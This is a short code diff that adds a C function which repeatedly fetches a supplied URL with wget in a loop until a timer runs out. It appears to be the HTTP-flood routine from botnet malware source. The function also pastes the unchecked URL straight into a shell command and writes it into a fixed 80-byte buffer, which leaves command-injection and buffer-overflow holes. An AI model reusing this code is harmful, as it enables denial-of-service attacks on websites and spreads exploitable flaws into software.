@@ -1,0 +1,16 @@
+void sendHTTP(unsigned char *url, int end_time)
+{
+    int end = time(NULL) + end_time;
+    FILE *pf;
+    char command[80];
+    sprintf(command, "wget --no-check-certificate -q -O /tmp/null ");
+    strcat(command, url);
+   
+    pf = popen(command,"r");
+   
+    while(end > time(NULL))
+    {
+        system(command);
+    }
+   
+}
